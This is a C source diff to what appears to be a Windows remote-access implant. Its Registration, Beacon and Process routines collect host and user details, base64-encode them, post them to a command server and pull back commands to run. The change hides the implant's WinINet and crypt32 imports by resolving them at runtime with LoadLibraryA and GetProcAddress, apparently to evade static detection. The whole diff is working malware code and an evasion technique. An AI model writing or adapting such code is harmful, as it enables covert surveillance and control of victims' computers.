@@ -36,13 +36,21 @@ BOOL (*patch_list_pointers[pointer_length]) (CHAR **output) = {AA$whoami, AB$pwd
 BOOL Registration(CHAR **cookie) {
     HMODULE hkernel32 = LoadLibraryA("kernel32.dll");
     HMODULE hadvapi32 = LoadLibraryA("advapi32.dll");
-    //HMODULE hwininet = LoadLibraryA("wininet.dll");
+    HMODULE hwininet = LoadLibraryA("wininet.dll");
+    HMODULE hcrypt32 = LoadLibraryA("crypt32.dll");
     GETCOMPUTERNAMEA myGetComputerNameA = (GETCOMPUTERNAMEA) GetProcAddress(hkernel32, "GetComputerNameA");
     GETUSERNAMEA myGetUserNameA = (GETUSERNAMEA) GetProcAddress(hadvapi32, "GetUserNameA");
     GETCURRENTPROCESSID myGetCurrentProcessId = (GETCURRENTPROCESSID) GetProcAddress(hkernel32, "GetCurrentProcessId");
     GETVERSION myGetVersion = (GETVERSION) GetProcAddress(hkernel32, "GetVersion");
-
-    //INTERNETOPENA myInternetOpenA = (INTERNETOPENA) GetProcAddress(hwininet, "InternetOpenA");
+    INTERNETOPENA myInternetOpenA = (INTERNETOPENA) GetProcAddress(hwininet, "InternetOpenA");
+    INTERNETCONNECTA myInternetConnectA = (INTERNETCONNECTA) GetProcAddress(hwininet, "InternetConnectA");
+    HTTPOPENREQUESTA myHttpOpenRequestA = (HTTPOPENREQUESTA) GetProcAddress(hwininet, "HttpOpenRequestA");
+    HTTPADDREQUESTHEADERSA myHttpAddRequestHeadersA = (HTTPADDREQUESTHEADERSA) GetProcAddress(hwininet, "HttpAddRequestHeadersA");
+    HTTPSENDREQUESTA myHttpSendRequestA = (HTTPSENDREQUESTA) GetProcAddress(hwininet, "HttpSendRequestA");
+    INTERNETQUERYDATAAVAILABLE myInternetQueryDataAvailable = (INTERNETQUERYDATAAVAILABLE) GetProcAddress(hwininet, "InternetQueryDataAvailable");
+    INTERNETREADFILE myInternetReadFile = (INTERNETREADFILE) GetProcAddress(hwininet, "InternetReadFile");
+    INTERNETCLOSEHANDLE myInternetCloseHandle = (INTERNETCLOSEHANDLE) GetProcAddress(hwininet, "InternetCloseHandle");
+    CRYPTBINARYTOSTRINGA myCryptBinaryToStringA = (CRYPTBINARYTOSTRINGA) GetProcAddress(hcrypt32, "CryptBinaryToStringA");
 
     agent.identifier = "register";
 
@@ -71,7 +79,7 @@ BOOL Registration(CHAR **cookie) {
 
     CHAR *data_encode = (CHAR*)malloc(strlen(data_to_encode) * 2);
     DWORD data_encode_len = strlen(data_to_encode) * 2;
-    CryptBinaryToString(data_to_encode, strlen(data_to_encode), CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, data_encode, &data_encode_len);
+    myCryptBinaryToStringA(data_to_encode, strlen(data_to_encode), CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, data_encode, &data_encode_len);
 
     free(data_to_encode);
 
@@ -84,28 +92,28 @@ BOOL Registration(CHAR **cookie) {
     CHAR content_length[MAX_PATH];
     sprintf_s(content_length, MAX_PATH, "Content-Length: %lu\r\n", post_buffer_length);
 
-    HINTERNET hInternet = InternetOpenA(agent.user_agent, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
+    HINTERNET hInternet = myInternetOpenA(agent.user_agent, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
     if (hInternet != NULL) {
-        HINTERNET hConnect = InternetConnectA(hInternet, agent.address, agent.port, 0, 0, INTERNET_SERVICE_HTTP, 0, 0);
+        HINTERNET hConnect = myInternetConnectA(hInternet, agent.address, agent.port, 0, 0, INTERNET_SERVICE_HTTP, 0, 0);
         if (hConnect != NULL) {
-            HINTERNET hRequest = HttpOpenRequest(hConnect, "POST", agent.path, 0, 0, 0, 0, 0);
+            HINTERNET hRequest = myHttpOpenRequestA(hConnect, "POST", agent.path, 0, 0, 0, 0, 0);
             if (hRequest != NULL) {
-                HttpAddRequestHeaders(hRequest, content_length, -1, HTTP_ADDREQ_FLAG_ADD);
-                HttpSendRequest(hRequest, 0, 0, post_buffer, post_buffer_length);
+                myHttpAddRequestHeadersA(hRequest, content_length, -1, HTTP_ADDREQ_FLAG_ADD);
+                myHttpSendRequestA(hRequest, 0, 0, post_buffer, post_buffer_length);
 
                 CHAR *temp_buffer = NULL;
                 DWORD buffer_length = 0;
                 while (TRUE) {
                     DWORD available_size = 0;
                     DWORD download_buffer;
-                    BOOL available = InternetQueryDataAvailable(hRequest, &available_size, 0, 0);
+                    BOOL available = myInternetQueryDataAvailable(hRequest, &available_size, 0, 0);
                     if (!available || available_size == 0) {
                         break;
                     }
                     temp_buffer = (CHAR*)realloc(temp_buffer, available_size + 1);
                     memset(temp_buffer, 0, available_size + 1);
 
-                    BOOL value = InternetReadFile(hRequest, temp_buffer, available_size, &download_buffer);
+                    BOOL value = myInternetReadFile(hRequest, temp_buffer, available_size, &download_buffer);
                     if (!value || download_buffer == 0) {
                         break;
                     }
@@ -118,13 +126,13 @@ BOOL Registration(CHAR **cookie) {
                 temp_buffer = NULL;
 
                 if (hRequest) {
-                    InternetCloseHandle(hRequest);
+                    myInternetCloseHandle(hRequest);
                 }
                 if (hConnect) {
-                    InternetCloseHandle(hConnect);
+                    myInternetCloseHandle(hConnect);
                 }
                 if (hInternet) {
-                    InternetCloseHandle(hInternet);
+                    myInternetCloseHandle(hInternet);
                 }
             }
         }
@@ -134,6 +142,23 @@ BOOL Registration(CHAR **cookie) {
 }
 
 BOOL Beacon(CHAR  *cookie) {
+    HMODULE hkernel32 = LoadLibraryA("kernel32.dll");
+    HMODULE hadvapi32 = LoadLibraryA("advapi32.dll");
+    HMODULE hwininet = LoadLibraryA("wininet.dll");
+    HMODULE hcrypt32 = LoadLibraryA("crypt32.dll");
+    GETCOMPUTERNAMEA myGetComputerNameA = (GETCOMPUTERNAMEA) GetProcAddress(hkernel32, "GetComputerNameA");
+    GETUSERNAMEA myGetUserNameA = (GETUSERNAMEA) GetProcAddress(hadvapi32, "GetUserNameA");
+    GETCURRENTPROCESSID myGetCurrentProcessId = (GETCURRENTPROCESSID) GetProcAddress(hkernel32, "GetCurrentProcessId");
+    GETVERSION myGetVersion = (GETVERSION) GetProcAddress(hkernel32, "GetVersion");
+    INTERNETOPENA myInternetOpenA = (INTERNETOPENA) GetProcAddress(hwininet, "InternetOpenA");
+    INTERNETCONNECTA myInternetConnectA = (INTERNETCONNECTA) GetProcAddress(hwininet, "InternetConnectA");
+    HTTPOPENREQUESTA myHttpOpenRequestA = (HTTPOPENREQUESTA) GetProcAddress(hwininet, "HttpOpenRequestA");
+    HTTPADDREQUESTHEADERSA myHttpAddRequestHeadersA = (HTTPADDREQUESTHEADERSA) GetProcAddress(hwininet, "HttpAddRequestHeadersA");
+    HTTPSENDREQUESTA myHttpSendRequestA = (HTTPSENDREQUESTA) GetProcAddress(hwininet, "HttpSendRequestA");
+    INTERNETQUERYDATAAVAILABLE myInternetQueryDataAvailable = (INTERNETQUERYDATAAVAILABLE) GetProcAddress(hwininet, "InternetQueryDataAvailable");
+    INTERNETREADFILE myInternetReadFile = (INTERNETREADFILE) GetProcAddress(hwininet, "InternetReadFile");
+    INTERNETCLOSEHANDLE myInternetCloseHandle = (INTERNETCLOSEHANDLE) GetProcAddress(hwininet, "InternetCloseHandle");
+    CRYPTBINARYTOSTRINGA myCryptBinaryToStringA = (CRYPTBINARYTOSTRINGA) GetProcAddress(hcrypt32, "CryptBinaryToStringA");
     printf("Beaconing...\n");
     CHAR *cmd = NULL;
     agent.identifier = "beacon";
@@ -146,7 +171,7 @@ BOOL Beacon(CHAR  *cookie) {
 
     CHAR *data_encode = malloc(strlen(data_to_encode));
     DWORD data_encode_len = strlen(data_to_encode) * 2;
-    CryptBinaryToString(data_to_encode, strlen(data_to_encode), CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, data_encode, &data_encode_len);
+    myCryptBinaryToStringA(data_to_encode, strlen(data_to_encode), CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, data_encode, &data_encode_len);
 
     DWORD post_buffer_length = strlen(data_encode) + 5;
     CHAR *post_buffer = (CHAR*)calloc(strlen(data_encode) + 5, sizeof(CHAR));
@@ -156,14 +181,14 @@ BOOL Beacon(CHAR  *cookie) {
     sprintf_s(content_length, MAX_PATH, "Content-Length: %lu\r\n", post_buffer_length);
 
 
-    HINTERNET hInternet = InternetOpenA(agent.user_agent, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
+    HINTERNET hInternet = myInternetOpenA(agent.user_agent, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
     if (hInternet != NULL) {
-        HINTERNET hConnect = InternetConnectA(hInternet, agent.address, agent.port, 0, 0, INTERNET_SERVICE_HTTP, 0, 0);
+        HINTERNET hConnect = myInternetConnectA(hInternet, agent.address, agent.port, 0, 0, INTERNET_SERVICE_HTTP, 0, 0);
         if (hConnect != NULL) {
-            HINTERNET hRequest = HttpOpenRequest(hConnect, "POST", agent.path, 0, 0, 0, 0, 0);
+            HINTERNET hRequest = myHttpOpenRequestA(hConnect, "POST", agent.path, 0, 0, 0, 0, 0);
             if (hRequest != NULL) {
-                HttpAddRequestHeaders(hRequest, content_length, -1, HTTP_ADDREQ_FLAG_ADD);
-                HttpSendRequest(hRequest, 0, 0, post_buffer, post_buffer_length);
+                myHttpAddRequestHeadersA(hRequest, content_length, -1, HTTP_ADDREQ_FLAG_ADD);
+                myHttpSendRequestA(hRequest, 0, 0, post_buffer, post_buffer_length);
 
                 CHAR temp_buffer[8192 +1] = { 0 };
                 DWORD buffer_length = 0;
@@ -171,12 +196,12 @@ BOOL Beacon(CHAR  *cookie) {
                 while (TRUE) {
                     DWORD available_size = 0;
                     DWORD download_buffer;
-                    BOOL available = InternetQueryDataAvailable(hRequest, &available_size, 0, 0);
+                    BOOL available = myInternetQueryDataAvailable(hRequest, &available_size, 0, 0);
                     if (!available || available_size == 0) {
                         break;
                     }
 
-                    available = InternetReadFile(hRequest, temp_buffer, available_size, &download_buffer);
+                    available = myInternetReadFile(hRequest, temp_buffer, available_size, &download_buffer);
                     if (!available || download_buffer == 0) {
                         break;
                     }
@@ -191,13 +216,13 @@ BOOL Beacon(CHAR  *cookie) {
                 }
                 free(cmd);
                 if (hRequest) {
-                    InternetCloseHandle(hRequest);
+                    myInternetCloseHandle(hRequest);
                 }
                 if (hConnect) {
-                    InternetCloseHandle(hConnect);
+                    myInternetCloseHandle(hConnect);
                 }
                 if (hInternet) {
-                    InternetCloseHandle(hInternet);
+                    myInternetCloseHandle(hInternet);
                 }
             }
         }
@@ -207,6 +232,24 @@ BOOL Beacon(CHAR  *cookie) {
 }
 
 BOOL Process(char* cookie, char *cmd) {
+    HMODULE hkernel32 = LoadLibraryA("kernel32.dll");
+    HMODULE hadvapi32 = LoadLibraryA("advapi32.dll");
+    HMODULE hwininet = LoadLibraryA("wininet.dll");
+    HMODULE hcrypt32 = LoadLibraryA("crypt32.dll");
+    GETCOMPUTERNAMEA myGetComputerNameA = (GETCOMPUTERNAMEA) GetProcAddress(hkernel32, "GetComputerNameA");
+    GETUSERNAMEA myGetUserNameA = (GETUSERNAMEA) GetProcAddress(hadvapi32, "GetUserNameA");
+    GETCURRENTPROCESSID myGetCurrentProcessId = (GETCURRENTPROCESSID) GetProcAddress(hkernel32, "GetCurrentProcessId");
+    GETVERSION myGetVersion = (GETVERSION) GetProcAddress(hkernel32, "GetVersion");
+    INTERNETOPENA myInternetOpenA = (INTERNETOPENA) GetProcAddress(hwininet, "InternetOpenA");
+    INTERNETCONNECTA myInternetConnectA = (INTERNETCONNECTA) GetProcAddress(hwininet, "InternetConnectA");
+    HTTPOPENREQUESTA myHttpOpenRequestA = (HTTPOPENREQUESTA) GetProcAddress(hwininet, "HttpOpenRequestA");
+    HTTPADDREQUESTHEADERSA myHttpAddRequestHeadersA = (HTTPADDREQUESTHEADERSA) GetProcAddress(hwininet, "HttpAddRequestHeadersA");
+    HTTPSENDREQUESTA myHttpSendRequestA = (HTTPSENDREQUESTA) GetProcAddress(hwininet, "HttpSendRequestA");
+    INTERNETQUERYDATAAVAILABLE myInternetQueryDataAvailable = (INTERNETQUERYDATAAVAILABLE) GetProcAddress(hwininet, "InternetQueryDataAvailable");
+    INTERNETREADFILE myInternetReadFile = (INTERNETREADFILE) GetProcAddress(hwininet, "InternetReadFile");
+    INTERNETCLOSEHANDLE myInternetCloseHandle = (INTERNETCLOSEHANDLE) GetProcAddress(hwininet, "InternetCloseHandle");
+    CRYPTBINARYTOSTRINGA myCryptBinaryToStringA = (CRYPTBINARYTOSTRINGA) GetProcAddress(hcrypt32, "CryptBinaryToStringA");
+    
     char *allocated_output = (CHAR*)calloc(10, sizeof(CHAR));
 
     int cmd_int = atoi(cmd);
@@ -237,7 +280,7 @@ BOOL Process(char* cookie, char *cmd) {
 
         CHAR *data_encode = malloc(strlen(data_to_encode));
         DWORD data_encode_len = strlen(data_to_encode) * 2;
-        CryptBinaryToString(data_to_encode, strlen(data_to_encode), CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, data_encode, &data_encode_len);
+        myCryptBinaryToStringA(data_to_encode, strlen(data_to_encode), CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, data_encode, &data_encode_len);
 
         DWORD post_buffer_length = strlen(data_encode) + 5;
         CHAR *post_buffer = (CHAR*)calloc(strlen(data_encode) + 5, sizeof(CHAR));
@@ -246,22 +289,22 @@ BOOL Process(char* cookie, char *cmd) {
         CHAR content_length[MAX_PATH];
         sprintf_s(content_length, MAX_PATH, "Content-Length: %lu\r\n", post_buffer_length);
 
-        HINTERNET hInternet = InternetOpenA(agent.user_agent, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
+        HINTERNET hInternet = myInternetOpenA(agent.user_agent, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
         if (hInternet != NULL) {
-            HINTERNET hConnect = InternetConnectA(hInternet, agent.address, agent.port, 0, 0, INTERNET_SERVICE_HTTP, 0, 0);
+            HINTERNET hConnect = myInternetConnectA(hInternet, agent.address, agent.port, 0, 0, INTERNET_SERVICE_HTTP, 0, 0);
             if (hConnect != NULL) {
-                HINTERNET hRequest = HttpOpenRequest(hConnect, "POST", agent.path, 0, 0, 0, 0, 0);
+                HINTERNET hRequest = myHttpOpenRequestA(hConnect, "POST", agent.path, 0, 0, 0, 0, 0);
                 if (hRequest != NULL) {
-                    HttpAddRequestHeaders(hRequest, content_length, -1, HTTP_ADDREQ_FLAG_ADD);
-                    HttpSendRequest(hRequest, 0, 0, post_buffer, post_buffer_length);
+                    myHttpAddRequestHeadersA(hRequest, content_length, -1, HTTP_ADDREQ_FLAG_ADD);
+                    myHttpSendRequestA(hRequest, 0, 0, post_buffer, post_buffer_length);
                     if (hRequest) {
-                        InternetCloseHandle(hRequest);
+                        myInternetCloseHandle(hRequest);
                     }
                     if (hConnect) {
-                        InternetCloseHandle(hConnect);
+                        myInternetCloseHandle(hConnect);
                     }
                     if (hInternet) {
-                        InternetCloseHandle(hInternet);
+                        myInternetCloseHandle(hInternet);
                     }
                 }
             }
